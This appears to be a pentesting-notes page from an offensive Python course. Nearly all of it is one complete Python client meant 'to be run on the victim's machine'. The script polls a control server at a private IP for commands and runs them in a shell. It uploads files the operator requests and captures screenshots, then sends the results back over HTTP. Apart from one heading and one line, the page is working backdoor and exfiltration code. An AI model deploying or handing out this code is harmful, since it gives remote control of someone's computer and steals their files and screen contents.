---
title: Making a screenshot
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - screenshot capturer
---

# Making a screenshot

## Client side

To be run on the victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import requests
import os
import subprocess
import time


from PIL import ImageGrab # Used to Grab a screenshot
import tempfile           # Used to Create a temp directory
import shutil             # Used to Remove the temp directory


while True:
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())

    elif 'screencap' in command: #If we got a screencap keyword, then ..

        dirpath = tempfile.mkdtemp() #Create a temp dir to store our screenshot file
        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG") #Save the screencap in the temp dir

        url = "http://192.168.0.152:8080/store"
        files = {'file': open(dirpath + "\img.jpg", 'rb')}
        r = requests.post(url, files=files) #Transfer the file over our HTTP

        files['file'].close() #Once the file gets transfered, close the file.
        shutil.rmtree(dirpath) #Remove the entire temp dir

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)

```